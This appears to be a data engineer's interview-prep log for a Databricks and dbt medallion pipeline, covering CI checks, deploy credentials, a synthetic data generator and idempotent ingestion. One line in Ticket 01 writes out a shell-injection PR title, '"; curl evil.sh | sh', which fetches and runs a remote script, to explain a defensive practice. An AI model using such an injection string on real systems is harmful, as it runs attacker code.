# Interview log

One entry per ticket, written before you close it.

## Ticket NN: title

- **Decision:**
- **Rejected alternative and why:**
- **Impact (numbers where you can):**
- **Hardest moment and how you got past it:**

## Ticket 01: Repo skeleton and CI gates

- **Decision:** Every change to the pipeline has to pass 13 automated checks before it can merge, and they run before anything touches Databricks. They cover SQL style (sqlfluff), Python bugs and types, tests, leaked credentials and vulnerable dependencies. Each check is its own job, so a red check says exactly which rule broke. On a data team, a bad dbt model doesn't fail loudly: it writes wrong numbers into a Gold table that a dashboard reads. Catching it at the PR is the cheapest place to stop it.
- **Rejected alternative and why:** I could have relied on code review alone and added checks later. Reviewers miss mechanical things like an inconsistently formatted model, an unpinned dependency or a pasted warehouse token, and the checks cost nothing to run on a public repo. I also rejected one big CI job: when a single job fails, you have to read the logs to find out why.
- **Impact (numbers where you can):** The gates are 13 checks and 31 tests, with coverage at 93% (floor 90) and a mutation score of 90.5% (19 of 21 deliberate bugs caught, floor 85). The dependency audit found 0 known vulnerabilities across 132 locked packages. A planted fake API key was caught by gitleaks (1 leak found, PR blocked). The full suite runs in a few minutes on every PR.
- **Hardest moment and how you got past it:** The SQL linter hung forever in CI. sqlfluff's dbt templater renders each model through dbt, and dbt-databricks opens a real warehouse connection to do it, so with placeholder credentials it waited indefinitely. A stack dump showed it stuck building dbt's relation cache. For now the lint passes because there are no models yet. Once models land, the lint job will need dev warehouse credentials. The other option is the plain Jinja templater, which needs no connection but renders macros less faithfully.

### Likely follow-up questions

- **Why does a data engineer care about CI?** dbt models are code that produces data. A broken model in production means wrong numbers in reports, and a backfill to fix them. Linting and testing at the PR is much cheaper than a data incident.
- **What's mutation testing?** The tool deliberately breaks the code, for example flipping `==` to `!=`, and checks whether a test fails. If no test fails, the tests aren't really checking that line. Coverage only says a line ran; mutation testing says a test would notice if it were wrong.
- **Why pin actions and dependencies to exact versions?** Reproducibility. The same commit should build the same way next month. It's the same idea as pinning a dbt package version so a model's output doesn't change underneath you. Pinning GitHub Actions to a commit SHA also stops a compromised tag from running someone else's code with access to your secrets.
- **Why pass the PR title through `env:`?** Anyone who opens a PR controls its title. Pasted straight into a shell command, a title like `"; curl evil.sh | sh` would run. As an environment variable it is only ever treated as text.
- **Why a lock file (`uv.lock`) and `--locked`?** The lock file records every package version. `--locked` fails CI if the lock file is out of date, so the versions audited are the versions that actually run.
- **What would you improve?** gitleaks-action only scans the commits the PR's commits API lists, so running the gitleaks binary over the full commit range would close that gap. Bundle validation waits for the Databricks workspace in ticket 02.

## Ticket 02: Free Edition proof (catalogs, service principals, CI deploy)

- **Decision:** Every deploy to staging and prod runs from GitHub Actions as a per-environment service principal using OAuth machine-to-machine credentials, defined as a Databricks Asset Bundle. Merging to `main` deploys to staging; prod waits for my approval in a protected GitHub Environment and deploys the same commit. Each principal only has write grants on its own catalog, so a staging credential cannot touch prod data even if it leaks.
- **Rejected alternative and why:** A personal access token in a repo secret, deployed with my own identity. It is quicker to set up, but every deploy would run as me with all my permissions, it would break if my account went away, and there is no per-environment separation. I also rejected one shared principal for both environments: one leaked secret would expose prod.
- **Impact (numbers where you can):** 3 catalogs, 2 deploy principals, 2 GitHub Environments with 3 secrets each, and 1 required reviewer. Secrets expire after 90 days and rotate with zero downtime (up to 5 active secrets per principal). The bootstrap doc reduces the manual setup to a fixed list of one-time steps; everything else is code.
- **Hardest moment and how you got past it:** The hello job passed every test locally but failed on Databricks with `SystemExit: 0`. Serverless runs Python tasks inside an IPython session, where `sys.exit()` raises an exception even with a success code, so Databricks marked a successful run as failed. The fix was to call `sys.exit` only for non-zero codes. Before that, the first run failed with a one-off 403 from Databricks' storage layer; checking the file through the API showed it had uploaded correctly, and a re-run passed that step.

### Likely follow-up questions

- **What is a service principal?** A non-human identity for automation. It has its own permissions and credentials, so deploys don't depend on a person's account, and access can be limited to exactly what the pipeline needs.
- **Why OAuth secrets over a personal token?** They belong to the principal not a person, they expire, they can be rotated without downtime, and their access is limited by Unity Catalog grants.
- **How is prod protected?** Three layers: prod only runs after staging succeeds (`needs: staging`), it waits for a required reviewer in the `prod` GitHub Environment, and only that job can read the prod secrets.
- **Development vs production bundle mode?** Development mode prefixes resources with your name, pauses schedules and deploys into your home folder, so experiments don't collide. Production mode deploys unprefixed resources to a shared path and expects a stable identity via `run_as`.
- **Why pin `databricks/setup-cli` to a SHA?** A tag can be moved to different code; a SHA cannot. The deploy job holds prod credentials, so it must only run code I've reviewed. Renovate (ticket 17) proposes updates as PRs.
- **What would you improve?** Restrict the shared bundle folder so only the deploy principals can write to it, and add a scheduled check that each principal can still log in, so an expired secret is caught before release day.

## Ticket 03: Chaos generator for Customer File Drops

- **Decision:** A seeded Python generator replays Olist Customers as one full CSV snapshot per day, written to `customers/ingest_date=YYYY-MM-DD/customers.csv`. A Customer first appears on the day of their first Order. Duplicates, malformed rows and address changes are injected at rates passed on the command line. The Olist files are downloaded at runtime from a GitHub mirror pinned to one commit, then cached locally.
- **Rejected alternative and why:** Committing the Olist CSVs, or a hand-made sample. Committing adds about 25 MB of third-party data (customers plus orders) to every clone, and a small hand-made sample has none of the real mess (repeat Customers, 99,441 rows). An unseeded generator was rejected too: every run would give different data, so a failing Silver test could never be reproduced.
- **Impact (numbers where you can):** 3 fault types (`missing_id`, `bad_zip`, `bad_date`) plus duplicates and address changes, each with its own test and rate. The same seed gives byte-identical files, so every later ticket tests against exactly the same mess. 99,441 Olist Customer rows collapse to 96,096, one per `customer_unique_id`. 3 real days from 2017-01-01 gave 331, 329 and 327 rows.
- **Hardest moment and how you got past it:** Making a stateful random process repeatable. Address changes depend on yesterday's state, so the generator walks Customers in sorted ID order and draws every random number from one `random.Random(seed)`, in a fixed order. Any loop over an unordered set would have broken byte identity. Mutation testing then showed tests that ran lines without checking them (for example, that a moved Customer gets a real address), and fixing those raised the score from 78.9% to 87.4%.

### Likely follow-up questions

- **Why full snapshots, not changes only?** Many source systems can only export the whole table. It forces Bronze to keep every file and Silver to work out what changed, which is the realistic, harder case.
- **Why does the chaos have to be repeatable?** A data test that fails must fail the same way on the next run, or you can't tell a fix from luck. A seed turns random data into a fixed fixture.
- **Why pin the download to a commit?** A branch can change under you; a commit cannot. Same idea as pinning actions to a SHA.
- **What would you improve?** Validate that rates are between 0 and 1 and that `--days` is positive, add schema drift (a new or renamed column on some day), and checksum the downloaded files.

## Ticket 04: Customer tracer slice, Bronze to dim_customer in dev

Answers are written to be said out loud. "Measured" numbers come from the Databricks job, Delta history, SQL on the tables, or a local Spark benchmark. "Projected" numbers are arithmetic from those measurements and are labelled as such.

### Reference sheet (the facts every answer draws on)

| Fact | Value | Source |
|---|---|---|
| File Drop | `/Volumes/dev/dbt_thomasjwrightmain_landing/files/customers/ingest_date=2017-01-01/customers_2017-01-01.csv` | job run |
| Bronze table | `dev.dbt_thomasjwrightmain_bronze.customers`, partitioned by `_file_drop_date` | `DESCRIBE DETAIL`: `partitionColumns: ["_file_drop_date"]` |
| Checkpoint | `.../files/_checkpoints/bronze_customers/` with `offsets/0`, `commits/`, `sources/0/rocksdb` | `databricks fs ls` |
| Raw rows | 331 rows, 326 distinct Customers, 0 empty IDs, 2 bad ZIPs, 0 bad dates, 0 rescued | SQL on Bronze |
| Silver result | 329 valid rows, 324 Customers: 2 bad-ZIP rows and 5 duplicate copies removed | SQL on Bronze |
| Gold result | 324 rows, 324 distinct `customer_key` | SQL on Gold |
| Idempotency | 4 job runs on the same drop, 1 Bronze write (`STREAMING UPDATE`, `numOutputRows=331`) | `DESCRIBE HISTORY` |
| Job runtime | run 708828557475645: 91 s (generate 16, Bronze 10, dbt 58); run 878137252751773: 101 s (13, 23, 57) | Jobs API |
| Benchmark | 90 drops, 207,517 rows, Spark `local[2]`: full reload 5.3 to 9.5 s, new day 1.9 s, no-op rerun 1.7 s | local benchmark |
| Tests | 7 Spark Bronze tests, 7 bundle and manifest tests, 3 dbt unit tests, 8 dbt data tests, mutation score 87.4% (floor 85%) | pytest, dbt, mutmut |

### "Walk me through what you built."

"It's the first vertical slice of a medallion pipeline on Databricks, from a raw CSV to a Gold dimension, deployed entirely from Git with a Databricks Asset Bundle. `databricks bundle deploy -t dev` creates two Unity Catalog schemas, a managed volume and a three-task job, all from `resources/customer_tracer_job.yml`.

Task one, `generate_customer_drop`, writes one day of Olist Customers into the landing volume, at `customers/ingest_date=2017-01-01/customers_2017-01-01.csv`. The generator injects realistic faults: exact duplicate rows, and malformed rows with an empty ID, a ZIP of `not-a-zip`, or a date of `not-a-date`.

Task two, `bronze_customers`, is a PySpark Auto Loader stream:

```python
spark.readStream.format("cloudFiles")
    .option("cloudFiles.format", "csv")
    .option("cloudFiles.schemaLocation", ".../_schemas/bronze_customers")
    .option("cloudFiles.schemaEvolutionMode", "rescue")
    .load(".../files/customers")
# + _ingested_at = current_timestamp(), _source_file = _metadata.file_path,
#   _file_drop_date = the date parsed out of ingest_date=YYYY-MM-DD in the path
    .writeStream.option("checkpointLocation", ".../_checkpoints/bronze_customers")
    .partitionBy("_file_drop_date")
    .trigger(availableNow=True)
    .toTable("dev.dbt_thomasjwrightmain_bronze.customers")
```

Task three runs `dbt build --target dev`. `stg_customers` trims, pads ZIPs to 5 digits, lower-cases city, upper-cases state, parses dates with `try_to_date`, drops rows it can't trust, and deduplicates with `qualify row_number()`. `dim_customer` is a Type 1 dimension keyed on `md5(customer_unique_id)`.

On the first real drop, 331 raw rows became 324 Customers, and four runs on the same drop wrote Bronze exactly once."

### "Why did you design it this way?"

**Why `availableNow` streaming instead of `spark.read`?**
"The checkpoint. A batch read has no memory, so every run rereads every file ever dropped, and a rerun appends the same rows again. Auto Loader records each file it has committed, in RocksDB under `sources/0` in the checkpoint. `availableNow` runs that like a batch job: it processes every unseen file, then stops, so the compute bill is per run, not 24/7.

I measured it locally on 90 daily drops, 207,517 rows. A full batch reload took 5.3 to 9.5 seconds. The incremental load of one new day, 5,602 rows, took 1.9 seconds, so 2.9 to 5 times faster. A rerun with nothing new took 1.7 seconds and wrote 0 rows; that 1.7 seconds is fixed stream start-up and checkpoint reading, not data work. On Databricks, four runs on the same drop produced exactly one `STREAMING UPDATE` in Delta history. The ratio isn't fixed: full-reload cost is proportional to total history, and incremental cost to one day, so at 365 days the gap is roughly 365 to 1 in data read (projected)."

**Why does Bronze keep strings, and use `rescue` mode?**
"Bronze's job is to never lose or reject data. All 5 columns are strings, so `not-a-date` loads as text instead of failing the whole file. If the source adds a column or sends a value that doesn't fit, `rescue` mode puts it in `_rescued_data` instead of failing the stream. On this drop, `_rescued_data` was null for all 331 rows, and I checked that with SQL rather than assuming it. Typing happens in Silver with `try_cast` and `try_to_date`, which return null instead of throwing, so one bad value costs one row, not the run."

**Why those three metadata columns?**
"Each one answers a question I'd otherwise have no way to answer. `_source_file` says which file a row came from, for debugging and for the dedupe tie-breaker. `_ingested_at` says when it was loaded, for ordering two versions with the same `updated_at`. `_file_drop_date` says which day's drop it belongs to; it's the partition column, so a query or replay for one day reads one directory."

**Why that dedupe order?**
"`row_number() over (partition by customer_unique_id order by updated_at desc, _ingested_at desc, _source_file desc)`. `updated_at` alone isn't enough. My unit test has Customer `u2` twice with `updated_at = 2017-01-02`: ZIP `40010` loaded at `2017-01-02 06:00` from `a.csv`, and ZIP `40020` loaded at `2017-01-03 06:00` from `b.csv`. Spark's `row_number()` on a tie is non-deterministic, so without the tie-breakers, Gold could flip between `40010` and `40020` from one run to the next. With them, the later load wins every time, and the test asserts `40020`."

**Why `md5(customer_unique_id)` as the surrogate key?**
"It's deterministic: rebuilding the table gives every Customer the same key, so facts never need re-pointing. A sequence or `monotonically_increasing_id()` changes on every rebuild. Gold has 324 rows and 324 distinct keys, enforced by `unique` and `not_null` tests on both `customer_key` and `customer_unique_id`."

**Why per-developer schemas?**
"Two engineers running `dbt build` into a shared `dev.silver` overwrite each other's `stg_customers` mid-test. Every developer gets `dev.dbt_<username>_landing`, `_bronze`, `_silver` and `_gold`, and staging and prod get plain `bronze`, `silver`, `gold`. A single `generate_schema_name` macro decides: in the `dev` target it returns `<target.schema>_<custom_schema>`, otherwise just `<custom_schema>`. A test runs `dbt parse` and asserts the schema of every model in the manifest for each target."

### "Tell me about a difficult problem. How did you solve it, and what was the outcome?"

"Getting the same YAML to produce correct, isolated names in dev and clean names in prod.

**Situation.** After my first `bundle deploy -t dev`, the job was `dbt_thomasjwrightmain_customer_tracer`, but the schemas were `dbt_thomasjwrightmainbronze`, with no underscore. dbt computes `dbt_thomasjwrightmain_silver` from its profile and reads Bronze from `dbt_thomasjwrightmain_bronze`, so every dbt run would fail with `TABLE_OR_VIEW_NOT_FOUND`.

**Action.** Rather than deploy-and-guess, I tested each hypothesis with `databricks bundle validate -t dev -o json`, which resolves every final name without touching the workspace, against throwaway copies of the repo. Five experiments gave four facts:
1. Development mode prefixes Unity Catalog schemas, and that can't be turned off.
2. For schemas it strips the trailing `_` from `name_prefix` and then concatenates; for jobs it keeps the `_`.
3. `name_prefix: ""` doesn't disable it; it falls back to `dev_<user>_`, which would give `dev.dev_thomasjwrightmain_bronze`.
4. A custom prefix like `dbt_tom_` is rejected: `prefix should contain the current username or ${workspace.current_user.short_name} to ensure uniqueness when using 'mode: development'`.

So the prefix has to contain the username, and the separator has to come from somewhere else. I added one bundle variable:

```yaml
variables:
  schema_separator: { default: "" }      # staging, prod: name: landing
targets:
  dev:
    presets: { name_prefix: dbt_${workspace.current_user.short_name}_ }
    variables: { schema_separator: _ }    # dev: dbt_thomasjwrightmain + _landing
resources:
  schemas:
    landing: { name: ${var.schema_separator}landing }
```

**Second problem, same week.** The dbt task then failed with `The profile 'analytics_platform' does not have a target named 'dev'. The valid target names for this profile are: - databricks_cluster`. The task had both `warehouse_id` and `profiles_directory`. The dbt task reference says `profiles_directory` can only be set when no `warehouse_id` is set; with a warehouse ID, Databricks generates its own `profiles.yml` with one `databricks_cluster` target and ignores mine. I removed `warehouse_id`, since my profile already points at the warehouse through `http_path`, and added a test asserting `"warehouse_id" not in dbt_task`.

**Outcome.** Dev resolves to `dbt_thomasjwrightmain_landing` and `_bronze` and prod to `landing` and `bronze`, from identical resource YAML. One `profiles.yml` now serves local runs, CI and the job. The job ran green end to end in 91 seconds, with zero manual UI steps. Both behaviours are pinned by tests, so a CLI upgrade that changes them fails in CI, not in a deploy."

### "What are you most proud of?"

"That idempotency is proven at every layer, and that I caught a bug that would have silently broken it.

To make File Drops look like real exports, I changed the file name to include a wall-clock timestamp, along the lines of `customers_20261126T061502.csv`. Then `test_rerunning_on_the_same_file_drop_adds_no_rows` made me think about what a rerun does. Auto Loader identifies files by path, so a rerun of the generator for 2017-01-01 would write a *new* path with the same 331 rows, and Bronze would go to 662 with nothing failing. I changed the name to derive from the drop's own date, `customers_2017-01-01.csv`. That's realistic, because many sources name exports by business date, and it makes generator output byte-for-byte reproducible.

The proof is layered. Locally, `test_rerunning_on_the_same_file_drop_adds_no_rows` runs the real stream twice on a Delta table and asserts the count doesn't change, and `test_a_new_file_drop_adds_only_its_own_rows` asserts a second day adds exactly its rows. On Databricks, Delta history shows one write in four runs, and Bronze stayed at 331 and Gold at 324. The mutation score is 87.4%: mutmut injected bugs into the code, and the tests caught 87.4% of them."

### "Tell me about a data quality decision you'd change."

"Silver currently *drops* invalid rows, and the numbers show why that's not good enough. The drop had 326 distinct Customers, but Gold has 324. The generator replaced 2 Customers' only row with a corrupted one (`zip_code_prefix = 'not-a-zip'`), so 2 Customers (0.6%) are missing from Gold with no trace except a count difference. The 5 duplicates were harmless: exact copies, collapsed to one row each.

Ticket 08 fixes that: `stg_customers` splits into valid rows and a `quarantine.customers` table with the failing rule per row, a quarantine-rate check fails the job above a threshold, and a `replay` parameter reprocesses a date range once the source corrects the data. The drop-rate here, 2 of 331 rows (0.6%), becomes a monitored metric instead of something I found by hand."

### "How would you improve this, and how would it scale to terabytes?"

"I'd start with sizing, from measured numbers. Bronze stored 331 rows in 12,366 bytes of compressed Parquet, about 37 bytes a row, so 1 TB is roughly 25 to 30 billion Customer rows. If that builds up over a year, it's about 2.7 GB a day (projected). Five changes follow from that:

1. **Silver becomes incremental.** Today `stg_customers` is a full rebuild, and its `row_number()` shuffles every Bronze row by `customer_unique_id`. At 1 TB that's a 1 TB shuffle every day. The fix (ticket 06):
   ```sql
   {{ config(materialized='incremental', incremental_strategy='merge', unique_key='customer_unique_id') }}
   ...
   {% if is_incremental() %}
   where _ingested_at >= (select max(_ingested_at) - interval 3 days from {{ this }})
   {% endif %}
   ```
   The daily shuffle drops to about 3 days times 2.7 GB, about 8 GB, roughly 125 times less than 1 TB (projected). The 3-day lookback catches late-arriving files. Liquid clustering Silver on `customer_unique_id` lets the `MERGE` skip files that can't contain a match.
2. **File discovery.** Directory listing scans the landing folder every run, which becomes the bottleneck with millions of files. `cloudFiles.useNotifications = true` switches to cloud storage events, so discovery cost stops growing with history. `cloudFiles.maxBytesPerTrigger = 10g` bounds each micro-batch, so a 30-day backfill of about 80 GB runs in 8 batches instead of one that runs out of memory.
3. **Partitioning.** At 331 rows a day, daily partitions are tiny files, which is why Databricks recommends liquid clustering below about 1 TB. At 2.7 GB a day, each partition is above the roughly 1 GB guideline, so `partitionBy(_file_drop_date)` becomes the right call. I'd verify with `EXPLAIN` and the `files pruned` metric in the query profile (ticket 16).
4. **Small files.** Streaming writes create many small files, so I'd set `delta.autoOptimize.optimizeWrite = true` and `autoCompact = true`, and schedule `OPTIMIZE`. A scan that opens 100,000 small files is dominated by per-file overhead.
5. **Measure first.** Today dbt is 57 of 91 to 101 seconds, about 60% of runtime, but on 331 rows that's almost all fixed overhead (warehouse connection, compilation, 11 test queries). At TB scale the queries dominate. I'd rank models by `execution_time` from dbt's `run_results.json`, and check the Spark UI for skew in the dedupe shuffle: one Customer with a million updates puts a million rows on one task, which AQE's skew handling or salting fixes."

### "Have you worked at terabyte scale?"

"Not on this project; it runs at about 200,000 rows on Databricks Free Edition. What I can show is the core pattern measured, not assumed: incremental ingestion was 2.9 to 5 times faster than a full reload at 91 files, with cost proportional to the day rather than history. I can do the sizing arithmetic for 1 TB, about 25 to 30 billion rows and 2.7 GB a day, and name the five changes it forces: incremental `MERGE` in Silver, notification-mode discovery, `maxBytesPerTrigger`, partitioning sized to the data, and compaction."

### Quick follow-ups

- **"What happens if the checkpoint is deleted?"** Auto Loader forgets what it loaded and reloads every file: Bronze would double to 662 rows. Silver's dedupe would still give 324 Customers, which is why the dedupe sits downstream of an append-only Bronze. The checkpoint lives in the landing volume, outside the watched `customers/` folder, so Auto Loader never reads its own files as data.
- **"What if a source resends a corrected file under a new name?"** Both load, because Auto Loader tracks paths, not content. Silver's tie-breakers then pick the correction deterministically, by later `updated_at` or later `_ingested_at`.
- **"Why not `cloudFiles.inferColumnTypes`?"** Inference would type `updated_at` as a date from the first files, and then a `not-a-date` value would land in `_rescued_data`, splitting one column's data across two places. Strings in Bronze keep every value in its own column.
- **"What does Type 1 cost an analyst?"** If Customer `u1` moves from Campinas to Salvador, Type 1 overwrites the city, so last year's 'orders by city' report silently moves their orders to Salvador. SCD Type 2 (ticket 07) adds `valid_from` and `valid_to`, and facts join on the version that was current at order time.
- **"Why does the dbt run take 58 s for 331 rows?"** Fixed cost: connecting to the serverless warehouse, compiling the project, and running 3 unit tests and 8 data tests as separate queries. That's why I measure per-model time before optimising anything.
